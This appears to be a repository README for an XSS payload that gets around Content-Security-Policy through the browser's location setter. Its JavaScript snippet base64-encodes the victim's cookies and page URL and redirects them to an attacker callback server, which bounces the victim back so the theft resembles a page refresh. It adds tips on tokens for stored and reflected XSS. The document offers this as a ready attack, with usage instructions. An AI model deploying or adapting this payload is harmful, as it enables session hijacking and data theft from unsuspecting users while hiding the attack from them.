## Bypass Content-Security-Policy to phish data

This demonstrates how the location setter of browsers are vulnerable to CSP bypassing.

This repo includes an example XSS payload and callback that, once executed, will change a browser's location to your callback server, which returns a **301 Moved Permanently** response sending the victim back to its referrer.

This example also includes a token to facilitate stored and reflected XSS; a token is added to the URL's anchor preventing the XSS payload from reactivating. It would of course be better practice if you extend this payload so that it removes the stored/reflected XSS entirely.

**When the attack is executed successfully, the victim experienced what seemed like a page refresh at most.**

## Usage

Use the following code in your XSS payload. You must change the new location's address to that of your callback server, and change the token at the very least.

You can shorten this code by removing the token if you are not using it in stored or reflected XSS.

```javascript
const token = "w3lRZ87e";
if (location.hash != token) globalThis.location = "https://mycallbackserver.net/callback.php" + 
  "?referer=" + encodeURIComponent(btoa(globalThis.location.href)) + 
  "&data=" + encodeURIComponent(btoa(document.cookie)) + 
  "&token=" + encodeURIComponent(btoa(token));
```

If the victim did not send a `referer` URL parameter, the attacker's server looks for a `Referer` header value. If neither of those are provided, the victim will be redirected to a panic address of your choice.
